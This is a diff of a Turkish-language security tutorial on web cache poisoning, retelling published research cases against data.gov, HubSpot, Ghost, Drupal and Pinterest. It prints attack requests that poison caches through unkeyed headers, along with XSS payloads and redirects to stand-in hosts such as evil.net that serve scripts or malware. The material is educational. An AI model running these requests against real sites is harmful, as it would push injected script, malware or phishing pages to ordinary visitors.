-Çıktıdan anlaşıldığı üzere data-site-root değerini kontrol edebiliyoruz. Ancak XSS elde etmek için tırnak dışına çıkamıyoruz. Hatta bu özelliğin tam olarak ne için kullanıldığını da belli değil. Öğrenmek için Burp’ta tüm isteklere bir `X-Forwarded-Host: [id-burpcollaborator.net](http://id-burpcollaborator.net)` başlığı ekleyecek bir bul-değiştir kuralı tanımlayıp sitede gezinebiliriz. Bu gezinti neticesinde bazı sayfalar yüklendiğinde sunucuya JavaScript tarafından oluşturulan aşağıdaki isteği gönderildi.
+Çıktıdan anlaşıldığı üzere data-site-root değerini kontrol edebiliyoruz. Ancak XSS elde etmek için tırnak dışına çıkamıyoruz. Hatta bu özelliğin tam olarak ne için kullanıldığını da belli değil. Öğrenmek için Burp’ta tüm isteklere bir `X-Forwarded-Host: id-burpcollaborator.net` başlığı ekleyecek bir bul-değiştir kuralı tanımlayıp sitede gezinebiliriz. Bu gezinti neticesinde bazı sayfalar yüklendiğinde sunucuya JavaScript tarafından oluşturulan aşağıdaki istek gönderildi.
 
 ```bash
 GET /api/i18n/en HTTP/1.1
@@ -277,7 +263,7 @@ HTTP/1.1 200 OK
 {}
 ```
 
-Bu **/api/i18n/en** yolu, web sitesinde bir yerde, bazı uluslararasılaştırma verilerinin nereden yükleneceğine karar vermek için data-site-root özelliğini kullanan JavaScript kodunun bulunduğunu gösteriyor. https://catalog.data.gov/api/i18n/en adresini ziyaret ettiğimizde yalnızca boş bir JSON yanıtı mevcut. Neyse ki 'en' değerini 'es' olarak değiştirdiğimizde bir ipucu elde ediyoruz:
+Bu **/api/i18n/en** yolu, web sitesinde bir yerde, bazı lokalleştirme verilerinin nereden yükleneceğine karar vermek için data-site-root özelliğini kullanan JavaScript kodunun bulunduğunu gösteriyor. https://catalog.data.gov/api/i18n/en adresini ziyaret ettiğimizde yalnızca boş bir JSON yanıtı mevcut. Neyse ki '**en**' değerini '**es**' olarak değiştirdiğimizde bir ipucu elde ediyoruz:
 
 ```bash
 GET /api/i18n/es HTTP/1.1
@@ -290,7 +276,7 @@ HTTP/1.1 200 OK
 {"Show more":"Mostrar más"}
 ```
 
-Buradaki dosya, cümleleri kullanıcının seçtiği dile çevirmek için bir harita içeriyor. Kendi çeviri dosyamızı oluşturarak ve kullanıcıları buna yönlendirmek için önbellek zehirlenmesini kullanarak, cümleleri kötüye kullanıma çevirebiliriz. Bunun için kendi websitemiz üzerinde örneğin  linuxdersleri.net**/api/i18n/en** adresinde `{"Show more":"<svg onload=alert(1)>"}` gibi bir json yanıtı sunabiliriz. Bu sayede biz kendi websitemizi `X-Forwarded-Host` başlığı ile önbelleğe kaydettiğimizde bizim websitemizdeki /api/i18n/en adresine istek yapılıp, “show more” ifadesinin yer aldığı her yere XSS payload’ı konularak zafiyet istismar edilmiş olacak. 
+Buradaki dosya, cümleleri kullanıcının seçtiği dile çevirmek için bir harita içeriyor. Kendi çeviri dosyamızı oluşturarak ve kullanıcıları buna yönlendirmek için önbellek zehirlenmesini kullanarak, çeviriyi kötüye kullanabiliriz. Bunun için kendi websitemiz üzerinde örneğin linuxdersleri.net**/api/i18n/en** adresinde `{"Show more":"<svg onload=alert(1)>"}` gibi bir json yanıtı sunabiliriz. Bu sayede biz kendi websitemizi `X-Forwarded-Host` başlığı ile önbelleğe kaydettiğimizde bizim websitemizdeki /api/i18n/en adresine istek yapılıp, “show more” ifadesinin yer aldığı her yere XSS payload’ı konularak zafiyet tetiklenmiş edilmiş olacak. 
 
 ```bash
 GET /dataset HTTP/1.1
@@ -317,11 +303,11 @@ HTTP/1.1 200 OK
 {"Show more":"<svg onload=alert(1)>"}
 ```
 
-Dolayısıyla “show more” ifadesinin yer aldığı tüm sayfalarda kullanıcılar XSS’ maruz kalacak.
+Dolayısıyla “Show more” ifadesinin yer aldığı tüm sayfalarda kullanıcılar XSS’e maruz kalacak.
 
-### **Hijacking Mozilla SHIELD | Mozilla SHIELD'ın ele geçirilmesi**
+### Mozilla SHIELD'ın ele geçirilmesi | **Hijacking Mozilla SHIELD**
 
-James Kettle, [catalog.data.gov](http://catalog.data.gov/) üzerinde gerçekleştirdiği araştırma esnasında uyguladığı XFH başlığı için bul-değiştir kuralı sayesinde Mozilla Shield mekanizmasında da bir zafiyet keşfetmiş. Proxy üzerinde istekte yer alan tamamı küçük harfli `origin: null` başlığı dikkatini çekmiş. 
+James Kettle, [catalog.data.gov](http://catalog.data.gov/) üzerinde gerçekleştirdiği araştırma esnasında uyguladığı `XFH` başlığı için bul-değiştir kuralı sayesinde Mozilla Shield mekanizmasında da bir zafiyet keşfetmiş. Proxy üzerinde istekte yer alan tamamı küçük harfli `origin: null` başlığı dikkatini çekmiş. 
 
 ```bash
 GET /api/v1/recipe/signed/ HTTP/1.1
@@ -334,8 +320,8 @@ X-Forwarded-Host: xyz.burpcollaborator.net
 
 Peki bu `origin: null` ne anlama geliyor ve ne zaman kullanılır diye kısaca açıklayacak olursak:
 
-1. **Yönlendirmeler**: Bir sayfa başka bir sayfaya yönlendirildiğinde, tarayıcı bazen yönlendirme sürecinde kaynak bilgisini kaybeder ve bu durumda "null" kökeni kullanır.
-2. **Yerel HTML Dosyaları**: Yerel olarak açılan HTML dosyaları, internete bağlı olmadıkları için bir kökene sahip değildirler ve bu nedenle "null" kökeni kullanırlar.
+1. **Yönlendirmeler**: Bir sayfa başka bir sayfaya yönlendirildiğinde, tarayıcı bazen yönlendirme sürecinde kaynak bilgisini kaybeder ve bu durumda "**null**" kökeni kullanır.
+2. **Yerel HTML Dosyaları**: Yerel olarak açılan HTML dosyaları, internete bağlı olmadıkları için bir kökene sahip değildirler ve bu nedenle "**null**" kökeni kullanırlar.
 
 ---
 
@@ -380,35 +366,31 @@ Tarifler imzalı olduğu için doğrudan kullanıcılara zararlı olabilecek ekl
 
 Bazı uygulamalar URL oluşturmak için HTTP başlıklarını hatalı şekilde kullanmanın ötesinde, bunları dahili istek yönlendirme için de kullanma hatasına düşebiliyor.
 
-```bash
-GET / HTTP/1.1
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
 Host: www.goodhire.com
-X-Forwarded-Server: test-degeri
-```
+<span style="color:DodgerBlue">X-Forwarded-Server: test-degeri</span>
+</code></pre></div></div>
 
-```bash
-HTTP/1.1 404 Not Found
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 404 Not Found
 CF-Cache-Status: MISS
 …
-<title>HubSpot - Page not found</title>
-<p>The domain test-degeri does not exist in our system.</p>
-```
+&lt;title&gt;HubSpot - Page not found&lt;/title&gt;
+&lt;p&gt;The domain <span style="color:DodgerBlue">test-degeri</span> does not exist <span class="k">in </span>our system.&lt;/p&gt;
+</code></pre></div></div>
 
-Alınan çıktından anlaşıldığı üzere [Goodhire.com](http://goodhire.com/) HubSpot'ta barındırılıyor ve HubSpot, `X-Forwarded-Server` başlığına `Host` başlığından daha fazla öncelik veriyor ve bu isteğin hangi istemciye yönelik olduğu konusunda kafa karışıklığı yaratıyor.
+Alınan çıktından anlaşıldığı üzere [Goodhire.com](http://goodhire.com/) HubSpot'ta barındırılıyor ve HubSpot, `X-Forwarded-Server` başlığına `Host` başlığından daha fazla öncelik veriyor ve bu durum isteğin hangi istemciye yönelik olduğu konusunda kafa karışıklığı yaratıyor.
 
 Bu durumdan yararlanmak için hubspot.com'a gitmemiz, kendimizi bir HubSpot istemcisi olarak kaydetmemiz, HubSpot sayfamıza bir XSS payload eklememiz ve ardından son olarak HubSpot'u goodhire.com'da bu yanıtı sunması için kandırmamız gerekiyor:
 
-```bash
-GET / HTTP/1.1
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
 Host: www.goodhire.com
-X-Forwarded-Host: portswigger-labs-4223616.hs-sites.com
-```
+<span style="color:DodgerBlue">X-Forwarded-Host: portswigger-labs-4223616.hs-sites.com</span>
+</code></pre></div></div>
 
-```bash
-HTTP/1.1 200 OK
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
 …
-<script>alert(document.domain)</script>
-```
+<span style="color:DodgerBlue">&lt;script&gt;alert<span class="o">(</span>document.domain<span class="o">)</span>&lt;/script&gt;</span>
+</code></pre></div></div>
 
 Servis cloudflare ile önbellek tutuğu için bu zararlı yanıt önbellek üzerinden sonraki ziyaretçilere sunulmuş oldu.
 
@@ -416,18 +398,17 @@ Servis cloudflare ile önbellek tutuğu için bu zararlı yanıt önbellek üzer
 
 Yönlendirme zehirlemesi açıkları her zaman bir önceki örnekte olduğu kadar aşikar olmayabilir:
 
-```bash
-GET / HTTP/1.1
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
 Host: blog.cloudflare.com
-X-Forwarded-Host: test-degeri
-```
+<span style="color:DodgerBlue">X-Forwarded-Host: test-degeri</span>
+</code></pre></div></div>
 
 ```bash
 HTTP/1.1 302 Found
 Location: https://ghost.org/fail/ 
 ```
 
-Cloudflare’ın blog’unun Ghost üzerinde barındırıldığını ve `X-Forwarded-Host` başlığının da Ghost üzerinde bir etkisi olduğunu aldığımız çıktıdan görebiliyoruz. Eğer hata yönlendirmesinden kaçınmak isterseniz [blog.binary.com](http://blog.binary.com) gibi bilinen bir blog adresini host olarak belirtebilirsiniz. Ancak tuhaf bir biçimde bu yalnızca 10 saniyelik gizemli bir gecikme ve ardından standaert [blog.cloudflare.com](http://blog.cloudflare.com) yanıtı ile sonuçlanır. 
+Cloudflare’ın blog’unun Ghost üzerinde barındırıldığını ve `X-Forwarded-Host` başlığının da Ghost üzerinde bir etkisi(fail yanıtı döndü) olduğunu aldığımız çıktıdan görebiliyoruz. Eğer hata yönlendirmesinden kaçınmak isterseniz [blog.binary.com](http://blog.binary.com) gibi bilinen bir blog adresini host olarak belirtebilirsiniz. Ancak tuhaf bir biçimde bu yalnızca 10 saniyelik gizemli bir gecikme ve ardından standaert [blog.cloudflare.com](http://blog.cloudflare.com) yanıtı ile sonuçlanır. 
 
 Yeni bir kullanıcı Ghost üzerinde ilk kez blog kaydettirdiğinde, [ghost.io](http://ghost.io) altında benzersiz bir alt alan adı üretiliyor. Tabii bu kullanıcı dilerse bu mevcut blog için [blog.cloudflare.com](http://blog.cloudflare.com/) gibi isteğe bağlı bir özel alan adı tanımlayabilir. Bir kullanıcı özel bir alan adı tanımladıysa, [Ghost.io](http://ghost.io/) alt alanı basitçe bu alana yönlendirilecektir:
 
@@ -438,7 +419,7 @@ Host: alan-adi.ghost.io
 
 ```bash
 HTTP/1.1 302 Found
-Location: http://alan-adi.blog/
+Location: http://ozel-alan-adi.blog/
 ```
 
 En önemlisi, aslında bu yönlendirme `X-Forwarded-Host` başlığı kullanılarak da tetiklenebilir:
@@ -451,25 +432,23 @@ X-Forwarded-Host: alan-adi.ghost.io
 
 ```bash
 HTTP/1.1 302 Found
-Location: http://alan-adi.blog/
+Location: http://ozel-alan-adi.blog/
 ```
 
-Bu sayede aslında [ghost.org](http://ghost.org) üzerinde bir hesap oluşturup kendi özel alan adımı tanımlayacak olursam, [blog.cloudflare.com](http://blog.cloudflare.com) isteklerini kendi siteme yönlendirmem mümkün oluyor.
+Bu sayede aslında [ghost.org](http://ghost.org) üzerinde bir hesap oluşturup kendi özel alan adımı tanımlayacak olursam, [blog.cloudflare.com](http://blog.cloudflare.com) isteklerini `X-Forwarded-Host` başlığını kullanılarak kendi siteme yönlendirmem mümkün oluyor. Bu isteği önbelleğe kaydedecek olursam, tüm ziyaretçileri benim adresime yönlendirebilirim.
 
 ### Anahtarsız Girişlerin Zincirlenmesi
 
 Bazı durumlarda, anahtar olarak kullanılmayan girdiler, uygulama yanıtı üzerinde küçük bir parçada bulunur. 
 
-```bash
-GET /en HTTP/1.1
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /en HTTP/1.1
 Host: redacted.net
-X-Forwarded-Host: xyz
-```
+<span style="color:DodgerBlue">X-Forwarded-Host: xyz</span>
+</code></pre></div></div>
 
-```bash
-HTTP/1.1 200 OK
-Set-Cookie: locale=en; domain=xyz
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+Set-Cookie: <span class="nv">locale</span><span class="o">=</span>en<span class="p">;</span> <span class="nv">domain</span><span class="o">=</span><span style="color:DodgerBlue">xyz</span>
+</code></pre></div></div>
 
 Gördüğünüz gibi `X-Forwarded-Host` başlığı, sunucunun çerezleri (`Set-Cookie`) belirli bir domaine (`xyz`) ayarlamasına neden oluyor. Ancak, yanıt içindeki URL'ler değiştirilmemiş. Tek başına bu bilgi, saldırı yapmak için yeterli değil.
 Bu durumdan yararlanmak için diğer anahtar olarak kullanılmayan girişlerle bu anahtarsız girişi birleştirmemiz gerekebilir. 
@@ -485,7 +464,7 @@ HTTP/1.1 301 Moved Permanently
 Location: https://redacted.net/en
 ```
 
-`X-Forwarded-Scheme` başlığı, sunucunun yanıtını yönlendiriyor ancak hedef domain değişmiyor. Tek başına bu bilgi de saldırı yapmak için yeterli değil.
+`X-Forwarded-Scheme: nothttps` başlığı, sunucunun yönlendirme yanıtı sunmasına sebep oluyor ancak hedef domain değişmiyor. Tek başına bu bilgi de saldırı yapmak için yeterli değil.
 Ancak ikisini birleştirirsek, sunucu yanıtının `Location` başlığını değiştirebiliriz ve bu, saldırganın kontrol ettiği bir domain'e yönlendirme sağlar.
 
 ```bash
@@ -506,20 +485,18 @@ Bu tekniği kullanarak bir POST isteğini yeniden yönlendirerek CSRF tokenlerin
 
 Open graph protokolü, websitelerinin içeriklerinin sosyal medyada paylaşıldığında nasıl görüneceğinin belirlenmesini sağlar.
 
-Örneğin anahtar olarak kullanılmayan XFH başlığı Open Graph URL adresini değiştiriyor:
+Örneğin anahtar olarak kullanılmayan `X-Forwarded-Host` başlığı Open Graph URL adresini değiştiriyor:
 
-```bash
-GET /en HTTP/1.1
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /en HTTP/1.1
 Host: redacted.net
-X-Forwarded-Host: attacker.com
-```
+<span style="color:DodgerBlue">X-Forwarded-Host: attacker.com</span>
+</code></pre></div></div>
 
-```bash
-HTTP/1.1 200 OK
-Cache-Control: max-age=0, private, must-revalidate
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+Cache-Control: max-age<span class="o">=</span>0, private, must-revalidate
 …
-<meta property="og:url" content='https://attacker.com/en'/>
-```
+&lt;meta <span class="nv">property</span><span class="o">=</span><span class="s2">"og:url"</span> <span class="nv">content</span><span class="o">=</span><span class="s1">'https://<span style="color:DodgerBlue">attacker.com</span>/en'</span>/&gt;
+</code></pre></div></div>
 
 Burada ele geçirdiğimiz **og:url** parametresi, paylaşılan URL'yi etkili bir şekilde geçersiz kılar, böylece bu sayfayı paylaşan herkes aslında bizim seçtiğimiz içeriği paylaşmış olur.
 
@@ -562,7 +539,7 @@ Bu yanıt önbelleğe alınmış olmasına karşın, Facebook üzerindeki “sha
 
 ![facebook-share]({{ site.url }}/blog/img/web-cache-poisoning/facebook-share.png){:class="responsive img-zoomable"}
 
-Burada `colo=AMS` satırı Facebook'un [wafproxy.net](http://wafproxy.net/)'e Amsterdam'daki bir önbellek üzerinden eriştiğini gösteriyor. Hedef web sitesine Atlanta aracılığıyla erişildiği için, oradan ayda 2 ABD doları tutarında bir VPS kiralayıp ve zehirlenmeyi tekrar denemiş araştırmacı:
+Burada `colo=AMS` satırı Facebook'un [waf.party](http://waf.party/)'e Amsterdam'daki bir önbellek üzerinden eriştiğini gösteriyor. Hedef web sitesine Atlanta aracılığıyla erişildiği için, oradan ayda 2 ABD doları tutarında bir VPS kiralayıp ve zehirlenmeyi tekrar denemiş araştırmacı:
 
 ![vps-cache-test]({{ site.url }}/blog/img/web-cache-poisoning/vps-cache-test.png){:class="responsive img-zoomable"}
 
@@ -602,14 +579,14 @@ Sonuçta bu isteği gönderdikten sonra Unity for Education sayfasına erişmeye
 
 ![unity-page]({{ site.url }}/blog/img/web-cache-poisoning/unity-page.png){:class="responsive img-zoomable"}
 
-Tek başına sayfaların yerini değiştirmek risk teşkil etmese de kritik güvenlik açıkları için bir adım olarak kullanılabilir.
+Tek başına sayfaların yerini değiştirmek risk teşkil etmese de yerine göre kritik güvenlik açıkları için bir adım olarak kullanılabilir.
 
 ### Dahili Önbellek Zehirlenmesi
 
 Drupal genellikle Varnish gibi üçüncü taraf önbelleklerle kullanılır, ancak aynı zamanda varsayılan olarak etkin olan dahili bir önbellek mekanizması da içerir. Bu önbellek, `X-Original-URL` başlığının farkındadır ve onu önbellek anahtarına ekler, ancak bu başlıktaki sorgu dizesini de dahil etme hatasına düşer:
 
-![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/a9dae521-1217-426d-ac08-d7323184935e/e81d5d22-29e1-4d69-a27d-3a5aa514be01/Untitled.png)
-![]({{ site.url }}/blog/img/web-cache-poisoning/uncolored.png){:class="responsive img-zoomable"}
+
+![local-cache]({{ site.url }}/blog/img/web-cache-poisoning/local-cache.png){:class="responsive img-zoomable"}
 
 Önceki saldırı bir yolu başka bir yolla değiştirmemize izin verirken, bu saldırı sorgu dizesini geçersiz kılmamıza olanak tanıyor:
 
@@ -647,11 +624,10 @@ Parametrenin üzerine yazma açığı ile open redirect açığını birlikte ku
 
 Pinterest'in bussines web sitesindeki belirli sayfalar, yönlendirme yoluyla JavaScript'i içe aktarıyor. Aşağıdaki istek, mavi renkle gösterilen önbellek girdisini turuncu renkle gösterilen parametreyle zehirler:
 
-```bash
-GET /?destination=https://evil.net\@business.pinterest.com/ HTTP/1.1
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET <span style="color:coral">/?destination<span class="o">=</span>https://evil.net<span class="se">\@</span>business.pinterest.com/</span> HTTP/1.1
 Host: business.pinterest.com
-X-Original-URL: /foo.js?v=1
-```
+X-Original-URL: <span style="color:DodgerBlue">/foo.js?v<span class="o">=</span>1</span>
+</code></pre></div></div>
 
 Bu, JavaScript içe aktarma işleminin hedefini ele geçiriyor ve [business.pinterest.com](http://business.pinterest.com/)'da statik olması gereken birkaç sayfa üzerinde tam kontrol imkanı sağlıyor:
 
@@ -659,10 +635,9 @@ Bu, JavaScript içe aktarma işleminin hedefini ele geçiriyor ve [business.pint
 GET /foo.js?v=1 HTTP/1.1
 ```
 
-```bash
-HTTP/1.1 302 Found
-Location: https://evil.net\@unity.com/
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 302 Found
+Location: https:/<span style="color:coral">/evil.net<span class="se">\@</span>unity.com/</span>
+</code></pre></div></div>
 
 ### İç içe Önbellek Zehirlenmesi
 
@@ -682,7 +657,7 @@ Host: store.unity.com
 X-Original-URL: /redir
 ```
 
-Sonuç olarak, unity.com'da 'setup indir'e tıklamak, evil.net'ten kötü amaçlı yazılımların indirilmesine neden olur. Bu teknik aynı zamanda RSS akışlarına sahte girişler eklemek, oturum açma sayfalarını kimlik avı sayfalarıyla değiştirmek ve dinamik script üzerinden stored XSS'yi de içeren çok sayıda başka saldırı için de kullanılabilir. 
+Sonuç olarak, unity.com'da 'setup indir'e tıklamak, evil.net'ten kötü amaçlı yazılımların indirilmesine neden olur. Bu teknik aynı zamanda RSS akışlarına sahte girişler eklemek, oturum açma sayfalarını kimlik avı sayfalarıyla değiştirmek ve dinamik script üzerinden stored XSS'i de içeren çok sayıda başka saldırı için de kullanılabilir. 
 
 Bu zafiyet 2018-05-29 tarihinde Drupal, Symfony ve Zend ekiplerine bildirilip  [SA-CORE-2018-005](https://www.drupal.org/SA-CORE-2018-005), [CVE-2018-14773](https://symfony.com/blog/cve-2018-14773-remove-support-for-legacy-and-risky-http-headers), [ZF2018-01](https://framework.zend.com/security/advisory/ZF2018-01) referans numaraları tanımlanmıştır.
 
@@ -690,17 +665,17 @@ Olası yaklaşımlar konusunda gözümüzü açması açından güzel bir örnek
 
 Şimdiye kadar ele aldığımız pratik yaklaşımlara ek olarak aşağıdaki araştırmayı da kısaca dahil ederek devam edebilliriz
 
-https://portswigger.net/research/web-cache-entanglement
+[https://portswigger.net/research/web-cache-entanglement](https://portswigger.net/research/web-cache-entanglement)
 
 ## Önbellek Testi
 
-Önbellek mekanizmasının nasıl çalıştığını anlamak için önbellek olduğundan emin olduğumuz bir nokta üzerinde testlerimizi gerçekleştirmemiz gerekiyor. 
+Önbellek mekanizmasının nasıl çalıştığını anlamak için önbellek mekanizmasının kullanıldığından emin olduğumuz bir nokta üzerinde testlerimizi gerçekleştirmemiz gerekiyor. 
 
-Testler sırasında önbellek durumunu takip etmemizi sağlayacak HIT MISS gibi dönüşlerin yanı sıra yanıt süresi de önbellek işlemi hakkında bize ipucu veriyor olacak.
+Testler sırasında önbellek durumunu takip etmemizi sağlayacak **HIT MISS** gibi dönüşlerin yanı sıra yanıt süresi de önbellek işlemi hakkında bize ipucu veriyor olacak.
 
 ### Anahtarın Kullanımını Keşfetmek
 
-Önbellek testi gerçekleştirebileceğimiz noktayı belirledikten sonra, bir dizi istek ile önbellek anahtarlarının kaydedilme esnasında girdiler üzerinde dönüşüm uygulanıp uygulanmadığını test etmemiz gerek. Genellikle belirli query parametreleri veya query dizesinin tamamı silinebiliyor veya Host başlıkları silinip URL ayrıştırma uygulanabiliyor. Yani önbellek anahtarı olarak kullanılan değerler de bir takım dönüşümler geçirdikten sonra nihai anahtar halini alıyorlar.
+Önbellek testi gerçekleştirebileceğimiz noktayı belirledikten sonra, bir dizi istek ile önbellek anahtarlarının kaydedilme esnasında girdiler üzerinde dönüşüm uygulanıp uygulanmadığını test etmemiz gerek. Genellikle belirli query parametreleri veya query dizesinin tamamı silinebiliyor veya `Host` başlıkları silinip URL ayrıştırma uygulanabiliyor. Yani önbellek anahtarı olarak kullanılan değerler de bir takım dönüşümler geçirdikten sonra nihai anahtar halini alıyorlar.
 
 Test etmek için her sorguda bir başka küçük değişiklik yaparak yanıtları kontrol etmemiz gerek. Örnek olarak `Host` başlığını yanıtta yansıtan bir servisi ele alalım:
 
@@ -741,36 +716,33 @@ Location: https://redacted.com:1337/en
 CF-Cache-Status: HIT
 ```
 
-Bu yanıt sayesinde port adresinin önbellek anahtarı olarak kullanıldığını teyit etmiş olduk. Bu sayede ana sayfaya ulaşmak isteyen kullanıcılar olmayan bir port adresine istek gönderecekleri için önbellekten yanıt dönülen kullanıcılar servise erişemeyecekler. 
+Bu yanıt sayesinde port adresinin önbellek anahtarı olarak **kullanılmadığını** teyit etmiş olduk. Bu sayede ana sayfaya ulaşmak isteyen kullanıcılar önbellek dolayısıyla olmayan bir port adresine istek gönderecekleri için önbellekten yanıt dönülen kullanıcılar servise erişemeyecekler. 
 
-Not: Buradaki örnekte, isteğin önbelleğe alınması için servisin hangi zaman veya koşulda önbellekleme yaptığı detayı göz ardı edilmiştir. Her isteğin her zaman önbelleğe alınmadığından daha önce bahsetmiştik. Burada örneği basit tutmak adına doğrudan sonuçlar gösteriliyor.
+<p class="mavi"><strong>ℹ️ Not:</strong> Buradaki örnekte, isteğin önbelleğe alınması için servisin hangi zaman veya koşulda önbellekleme yaptığı detayı göz ardı edilmiştir. Her isteğin her zaman önbelleğe alınmadığından daha önce bahsetmiştik. Burada örneği basit tutmak adına doğrudan sonuçlar gösteriliyor.</p>
 
 Web cache açıklarını dikkate değer kılmak için web servisinin sunduğu çeşitli özelliklerle birlikte akıllıca tetiklenecek hale getirmemiz gerek. Anlatım sırasında bu duruma dair örnekleri ele alacağız. 
 
 Örneğin XSS açıklarını stored formuna getirmemiz, dinamik olarak oluşturulan JS vs CSS kaynaklarını manipüle etmemiz ve standart tarayıcıların göndermeyeceği normalde “sömürülemez” kabul edilen açıklardan yararlanmamız mümkün olacak.
 
-Anahtar Olarak Kullanılmayan “Query” Tespiti
+### Anahtar Olarak Kullanılmayan “Query” Tespiti
 
-Çoğu önbellek anahtar mekanizması query yani sorgu satırının tamamını önbellek anahtarı olarak ele almaz.
+Çoğu önbellek anahtar mekanizması "query" yani sorgu dizesinin tamamını önbellek anahtarı olarak ele almaz.
 
 Test etmek için bir parametrenin değerini değiştirerek ve yanıtlardaki bazı farklılıkları gözlemleyerek çoğu dinamik sayfayı kolayca tanıyabilirsiniz.
 
-```bash
-GET /?q=canary HTTP/1.1
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /?q<span class="o">=</span><span style="color:DodgerBlue">canary</span> HTTP/1.1
 Host: example.com
-```
+</code></pre></div></div>
 
-```bash
-HTTP/1.1 200 OK
-<link rel="canonical" href="https://example.com/?q=canary"
-```
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+&lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"canonical"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"https://example.com/?q=<span style="color:DodgerBlue">canary</span>"</span>
+</code></pre></div></div>
 
-Ancak bu yaklaşım, sorgu dizesi önbellek anahtarının dışında bırakıldığında işe yaramaz. Bu durumda, fazladan bir önbellek bozucu parametresi eklemenin bile hiçbir etkisi olmayacaktır:
+Ancak bu yaklaşım, query sorgu dizesi önbellek anahtarı için kullanılmıyorsa işe yaramaz. Bu durumda, fazladan bir önbellek bozucu parametresi eklemenin bile hiçbir etkisi olmayacaktır. Aşağıdakiler, query'nin önbellek anahtarı olarak kullanılmadığı duruma örnek:
 
-```bash
-GET /?q=canary&cachebuster=1234 HTTP/1.1
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /?q<span class="o">=</span><span style="color:DodgerBlue">canary&amp;cachebuster<span class="o">=</span>1234</span> HTTP/1.1
 Host: example.com
-```
+</code></pre></div></div>
 
 ```bash
 HTTP/1.1 200 OK
@@ -778,25 +750,25 @@ CF-Cache-Status: HIT
 
 <link rel="canonical" href="https://example.com/
 ```
+Eğer query, önbellek üretimi için kullanılıyor olsaydı ***canary&cachebuster=1234*** dizesi yeni bir önbellek oluşturacaktı, ancak böyle olmadığını çıktıdan görebiliyoruz.
 
 Sayfa, önbelleğe alma işleminin ne zaman gerçekleştiğini açıkça belirtmediği sürece, buradaki güvenlik açığını fark etmek özellikle otomatik tarama yapan araçlar ile zordur.
 
 Bu noktada önbellek anahtarı olarak kullanılan diğer bileşenleri değiştirerek, yeniden önbelleğe almaya zorlayabiliriz.
 
-```bash
-GET /?q=canary&cachebust=nwf4ws HTTP/1.1
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /?q<span class="o">=</span><span style="color:DodgerBlue">canary&amp;cachebust<span class="o">=</span>nwf4ws</span> HTTP/1.1
 Host: example.com
-Accept-Encoding: gzip, deflate, nwf4ws
-Accept: */*, text/nwf4ws
-Cookie: nwf4ws=1
-Origin: https://nwf4ws.example.com
-```
+Accept-Encoding: <span class="nb">gzip</span>, deflate, <span style="color:DodgerBlue">nwf4ws</span>
+Accept: <span class="k">*</span>/<span class="k">*</span>, <span style="color:DodgerBlue">text/nwf4ws</span>
+Cookie: <span class="nv"><span style="color:DodgerBlue">nwf4ws</span><span class="o">=</span>1</span>
+Origin: <span style="color:DodgerBlue">https://nwf4ws.example.com</span>
+</code></pre></div></div>
 
 Bu yaklaşım bazı sistemlerde harika çalışır; örneğin, Cloudflare çalıştıran siteler, varsayılan olarak `Origin`'i önbellek anahtarına ekler. Bu gibi önbellek anahtarı olarak kullanılan başlıklarda değişimler yaparak yeni ve benzersiz önbellek oluşumunu tetikleyebiliriz. Ancak bu yaklaşım mükemmel değildir; bazı siteler önbellek anahtarlarında bu başlıkların hiçbirini içermez ve diğer sitelerde önbellek bozucularımız bazı şeyleri bozabilir.
 
-Buradaki amacımız önbellek mekanizmasını test ederken benzersiz bir önbellek yanıtı ile sistemi tanımamız. Bu sebeple önbellek mekanizmasını sıfırlamak için aslında `PURGE` ve `FASTLPURGE`(fastly üzerinde) HTTP metotları sayesinde aslında önbelleklerin sıfırlanmasını talep de edebiliriz. Bu sayede var olan önbelleklerden kurtulup yenilerini oluşturarak sistemi tanımaya devam edebiliriz.
+Buradaki amacımız önbellek mekanizmasını test ederken benzersiz bir önbellek yanıtı ile sistemi tanımamız. Bu sebeple önbellek mekanizmasını sıfırlamak için aslında `PURGE` ve `FASTLPURGE`(fastly üzerinde) HTTP metotları sayesinde  önbelleklerin sıfırlanmasını talep de edebiliriz. Bu sayede var olan önbelleklerden kurtulup yenilerini oluşturarak sistemi tanımaya devam edebiliriz.
 
-Bir diğer yöntem size pek çok önbellek mekanizması anahtar olarak path yani url yolunu kullandığı için backend sistemine göre yolun normalleştirildiği farklı karakterleri kullanabiliriz. Aşağıdaki örnekler dort farklı sistemde `/` yoluna işaret ediyor aslında:
+Bir diğer yöntem size pek çok önbellek mekanizması anahtar olarak path yani URL yolunu kullandığı için backend sistemine göre yolun normalleştirildiği farklı karakterleri kullanabiliriz. Aşağıdaki örnekler dört farklı sistemde `/` yoluna işaret ediyor aslında:
 
 ```bash
 Apache: //
@@ -809,19 +781,17 @@ PHP: /index.php/xyz
 
 ### Anahtar Olarak Kullanılmayan Query’den Yararlanmak
 
-Örneğin aşağıdaki istek, gazetedeki her sayfa XSS’e yol açan bir query yansıtması barındırıyor. XSS payload’ı query kısmına girdiğimizde yanıta eklendiği için zararlı kod yanıtta yer alıyor.
+Örneğin aşağıdaki istek, gazetedeki her sayfada XSS’e yol açan bir query yansıtması barındırıyor. XSS payload’ı query kısmına girdiğimizde yanıta eklendiği için zararlı kod yanıtta yer alıyor.
 
-```bash
